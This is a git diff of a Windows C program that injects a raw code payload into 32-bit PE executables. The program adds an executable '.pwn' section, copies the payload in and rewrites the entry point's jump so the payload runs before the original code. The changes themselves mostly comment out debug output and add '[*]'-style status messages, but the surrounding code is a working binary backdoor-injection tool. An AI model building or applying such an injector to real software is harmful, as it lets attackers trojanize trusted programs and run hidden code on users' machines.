@@ -55,11 +55,11 @@ int main(int argc, char* argv[])
 	hPayloadFile = CreateFile(payload, GENERIC_READ, 0, NULL, OPEN_EXISTING, NULL, NULL);
 
 	if (hPayloadFile != INVALID_HANDLE_VALUE) {
-		printf("success opening payload file\n");
+		printf("[*] success opening payload file\n");
 
 		payloadSize = GetFileSize(hPayloadFile, NULL);
 
-		printf("payload size: 0x%lX\n", payloadSize);
+		printf("[*] payload size: 0x%lX\n", payloadSize);
 
 
 
@@ -74,13 +74,13 @@ int main(int argc, char* argv[])
 			return 0;
 		}
 
-		for (size_t i = 0; i < payloadSize; i++) {
+		/*for (size_t i = 0; i < payloadSize; i++) {
 			printf("%X, ", payloadSpace[i]);
 
 			if (i % 10 == 0) {
 				printf("\n");
 			}
-		}
+		}*/
 
 
 		CloseHandle(hPayloadFile);
@@ -98,7 +98,7 @@ int main(int argc, char* argv[])
 
 	if (hFile != INVALID_HANDLE_VALUE) {
 
-		printf("success opening file\n");
+		printf("[*] success opening PE\n");
 
 		if (readDOSHeader(hFile) != 0) {
 			HeapFree(hHeap, 0, payloadSpace);
@@ -147,8 +147,8 @@ int init(int argc, char* argv[]) {
 		}
 		else
 		{
-			printf("path raw code: %s\n", argv[2]);
-			printf("path PE: %s\n", argv[4]);
+			printf("\n[*] path raw code: %s\n", argv[2]);
+			printf("[*] path PE: %s\n", argv[4]);
 
 			swprintf(payload, sizeof(payload) / sizeof(TCHAR), L"%hs", argv[2]);
 			swprintf(filePath, sizeof(filePath) / sizeof(TCHAR), L"%hs", argv[4]);
@@ -210,34 +210,17 @@ int createEmptySection(HANDLE hFile) {
 		imageEmptySectionHeader.PointerToRawData = rawAddress;
 		imageEmptySectionHeader.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
 
-		printf("%s\n", imageEmptySectionHeader.Name);
-		printf("%lX\n", imageEmptySectionHeader.Misc.VirtualSize);
-		printf("%lX\n", imageEmptySectionHeader.VirtualAddress);
-		printf("%lX\n", imageEmptySectionHeader.SizeOfRawData);
-		printf("%lX\n", imageEmptySectionHeader.PointerToRawData);
-		printf("%lX\n", imageEmptySectionHeader.PointerToRelocations);
-		printf("%lX\n", imageEmptySectionHeader.PointerToLinenumbers);
-		printf("%hX\n", imageEmptySectionHeader.NumberOfRelocations);
-		printf("%hX\n", imageEmptySectionHeader.NumberOfLinenumbers);
-		printf("%lX\n", imageEmptySectionHeader.Characteristics);
-
 		padding = fileSize - imageEmptySectionHeader.PointerToRawData;
-		printf("padding: %lX\n", padding);
 
 		padding += imageEmptySectionHeader.Misc.VirtualSize;
-		printf("padding: %lX\n", padding);
 
 		if (padding % imageOptionalHeader32.FileAlignment != 0) {
 			padding = imageOptionalHeader32.FileAlignment * ((padding + imageOptionalHeader32.FileAlignment) / imageOptionalHeader32.FileAlignment);
 		}
 
-		printf("padding: %lX\n", padding);
 		padding += imageEmptySectionHeader.PointerToRawData;
-
-		printf("padding: %lX\n", padding);
 		padding -= fileSize;
 
-		printf("padding: %lX\n", padding);
 
 		HANDLE hHeap = GetProcessHeap();
 
@@ -246,7 +229,7 @@ int createEmptySection(HANDLE hFile) {
 		SetFilePointer(hFile, fileSize, NULL, FILE_BEGIN);
 
 		if (WriteFile(hFile, paddingSpace, padding, &bytesRead, NULL) != 0) {
-			printf("Added padding successfully\n");
+			//printf("Added padding successfully\n");
 		}
 		else {
 			errorHandling();
@@ -287,10 +270,10 @@ int insertCode(HANDLE hFile, BYTE* payloadSpace) {
 
 		DWORD rawEntryPoint = imageTextSectionHeader.PointerToRawData + (imageOptionalHeader32.AddressOfEntryPoint - imageTextSectionHeader.VirtualAddress);
 
-		printf("pointer to raw data: %lX\n", imageTextSectionHeader.PointerToRawData);
+		/*printf("pointer to raw data: %lX\n", imageTextSectionHeader.PointerToRawData);
 		printf("entry point: %lX\n", imageOptionalHeader32.AddressOfEntryPoint);
 		printf("text virtual address: %lX\n", imageTextSectionHeader.VirtualAddress);
-		printf("raw entry point: %lX\n", rawEntryPoint);
+		printf("raw entry point: %lX\n", rawEntryPoint);*/
 
 		BYTE opcode = 0x0;
 		LONG32 displacementRelToNextInst = 0x0;
@@ -309,16 +292,16 @@ int insertCode(HANDLE hFile, BYTE* payloadSpace) {
 			return -1;
 		}
 
-		printf("opcode: %X\n", opcode);
+		/*printf("opcode: %X\n", opcode);
 		printf("displacement to next instruciton: %lX\n", displacementRelToNextInst);
-		printf("displacement to next instruciton: %ld\n", displacementRelToNextInst);
+		printf("displacement to next instruciton: %ld\n", displacementRelToNextInst);*/
 
 
 
 		BYTE jmpOpcode = 0xE9;
 		DWORD jmpDisRelToNextInst = imageSectionHeader.VirtualAddress - (imageOptionalHeader32.AddressOfEntryPoint + (sizeof(BYTE) * 2) + (sizeof(DWORD) * 2));
 
-		printf("%lX\n", jmpDisRelToNextInst);
+		//printf("%lX\n", jmpDisRelToNextInst);
 
 		SetFilePointer(hFile, rawEntryPoint + sizeof(opcode) + sizeof(displacementRelToNextInst), NULL, FILE_BEGIN);
 
@@ -355,10 +338,10 @@ int insertCode(HANDLE hFile, BYTE* payloadSpace) {
 
 		LONG32 jumpToOrginalCode = (imageSectionHeader.VirtualAddress + sizeof(pushGeneralRegisterAndFlagsX86) + sizeof(popGeneralRegisterAndFlagsX86) + payloadSize + 0x5) - (imageOptionalHeader32.AddressOfEntryPoint + (sizeof(BYTE) * 2) + (sizeof(DWORD) * 2));
 		jumpToOrginalCode *= -1;
-		printf("%ld\n", jumpToOrginalCode);
+		//printf("%ld\n", jumpToOrginalCode);
 		jumpToOrginalCode += displacementRelToNextInst;
 
-		printf("%lX\n", jumpToOrginalCode);
+		//printf("%lX\n", jumpToOrginalCode);
 
 		if (WriteFile(hFile, &opcode, sizeof(opcode), &bytesRead, NULL) == 0) {
 			errorHandling();
@@ -371,6 +354,8 @@ int insertCode(HANDLE hFile, BYTE* payloadSpace) {
 			CloseHandle(hFile);
 			return -1;
 		}
+
+		printf("\n[*] Code Inserted Succesffully!!!!\n");
 
 	}
 	else if (magic == 0x20b) {
@@ -418,7 +403,7 @@ int createNewSection(HANDLE hFile) {
 		imageSectionHeader.PointerToRawData = rawAddress;
 		imageSectionHeader.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
 
-		printf("%s\n", imageSectionHeader.Name);
+		/*printf("%s\n", imageSectionHeader.Name);
 		printf("%lX\n", imageSectionHeader.Misc.VirtualSize);
 		printf("%lX\n", imageSectionHeader.VirtualAddress);
 		printf("%lX\n", imageSectionHeader.SizeOfRawData);
@@ -427,7 +412,7 @@ int createNewSection(HANDLE hFile) {
 		printf("%lX\n", imageSectionHeader.PointerToLinenumbers);
 		printf("%hX\n", imageSectionHeader.NumberOfRelocations);
 		printf("%hX\n", imageSectionHeader.NumberOfLinenumbers);
-		printf("%lX\n", imageSectionHeader.Characteristics);
+		printf("%lX\n", imageSectionHeader.Characteristics);*/
 
 		fileSize = GetFileSize(hFile, NULL);
 
@@ -450,17 +435,17 @@ int createNewSection(HANDLE hFile) {
 			for (size_t i = 0; i < imageSectionHeader.SizeOfRawData; i++) {
 
 				if (caveMiner[i] != 0x0) {
-					printf("no space found!..\n");
+					//printf("no space found!..\n");
 					imageSectionHeader.PointerToRawData = fileSize;
 					isEmptySectionCreated = 0x1;
 					break;
 				}
 
-				printf("%X, ", caveMiner[i]);
+				/*printf("%X, ", caveMiner[i]);
 
 				if (i != 0 && i % 10 == 0) {
 					printf("\n");
-				}
+				}*/
 			}
 
 
@@ -497,7 +482,7 @@ int createNewSection(HANDLE hFile) {
 
 		if (isEmptySectionCreated == 0x1) {
 			if (WriteFile(hFile, &imageEmptySectionHeader, sizeof(imageEmptySectionHeader), &bytesRead, NULL) != 0) {
-				printf("empty Section created successfully\n");
+				printf("[*] empty Section created successfully\n");
 			}
 			else {
 				errorHandling();
@@ -509,7 +494,7 @@ int createNewSection(HANDLE hFile) {
 		imageSectionHeader.PointerToRawData += padding;
 
 		if (WriteFile(hFile, &imageSectionHeader, sizeof(imageSectionHeader), &bytesRead, NULL) != 0) {
-			printf("Section created successfully\n");
+			printf("[*] .pwn Section created successfully\n");
 		}
 		else {
 			errorHandling();
@@ -523,7 +508,7 @@ int createNewSection(HANDLE hFile) {
 		byte* sectionEmptyData = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, imageSectionHeader.SizeOfRawData);
 
 		if (WriteFile(hFile, sectionEmptyData, imageSectionHeader.SizeOfRawData, &bytesRead, NULL) != 0) {
-			printf("Section filled with zeros\n");
+			//printf("Section filled with zeros\n");
 		}
 		else {
 			errorHandling();
@@ -549,7 +534,7 @@ int createNewSection(HANDLE hFile) {
 		SetFilePointer(hFile, imageDOSHeader.e_lfanew + sizeof(DWORD) + sizeof(WORD), NULL, FILE_BEGIN);
 
 		if (WriteFile(hFile, &imageFileHeader.NumberOfSections, sizeof(imageFileHeader.NumberOfSections), &bytesRead, NULL) != 0) {
-			printf("updated number of sections\n");
+			printf("[*] updated number of sections\n");
 		}
 		else {
 			errorHandling();
@@ -560,7 +545,7 @@ int createNewSection(HANDLE hFile) {
 		SetFilePointer(hFile, imageDOSHeader.e_lfanew + sizeof(DWORD) + sizeof(imageFileHeader) + (sizeof(WORD) * 7) + (sizeof(DWORD) * 10) + (sizeof(BYTE) * 2), NULL, FILE_BEGIN);
 
 		if (WriteFile(hFile, &imageOptionalHeader32.SizeOfImage, sizeof(imageOptionalHeader32.SizeOfImage), &bytesRead, NULL) != 0) {
-			printf("updated size of the image\n");
+			printf("[*] updated size of the image\n");
 		}
 		else {
 			errorHandling();
@@ -648,6 +633,8 @@ int readOptionalHeader(HANDLE hFile) {
 			printf("%-25s: %-25lX\n", FileAlignment, imageOptionalHeader32.FileAlignment);
 			printf("%-25s: %-25lX\n", SizeOfImage, imageOptionalHeader32.SizeOfImage);
 			printf("%-25s: %-25lX\n", SizeOfHeaders, imageOptionalHeader32.SizeOfHeaders);
+			printf("\n");
+			printf("\n");
 		}
 		else {
 			errorHandling();
@@ -729,6 +716,7 @@ int readDOSHeader(HANDLE hFile) {
 	char* e_lfanew = "e_lfanew";
 
 	if (ReadFile(hFile, &imageDOSHeader, sizeof(imageDOSHeader), &bytesRead, NULL) != 0) {
+		printf("\n************************ HEADERS OVERVIEW ******************\n\n");
 		printf("%-25s: %-25lX\n", e_lfanew, imageDOSHeader.e_lfanew);
 	}
 	else
